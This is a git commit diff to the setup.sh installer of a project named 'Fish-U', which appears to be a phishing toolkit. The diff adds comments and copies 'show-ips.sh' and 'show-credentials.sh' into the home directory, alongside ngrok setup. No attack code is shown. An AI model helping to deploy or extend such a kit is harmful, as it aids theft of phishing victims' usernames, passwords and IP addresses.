11a3c3c6c059f869ed21f6d86c38ef7a5e0dfa52
WLS <77196153+WLS-SD@users.noreply.github.com>
2021-09-20 10:30:00 +0545

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -26,13 +26,13 @@ cd ui
 chmod +x *
 cd ..
 
-
+#For Main Script
 cd core
 chmod +x *
 cp fish-u.sh $HOME
 cd ..
 
-
+#For Update
 cd utilities
 cp update-fish-u.sh $HOME
 cd
@@ -54,5 +54,12 @@ chmod +x ngrok
 
 
 
+#Show Username_Password & ip.
 
+cd
+cd Fish-U
+cd utilities
+chmod +x *
+cp show-ips.sh $HOME
+cp show-credentials.sh $HOME
 
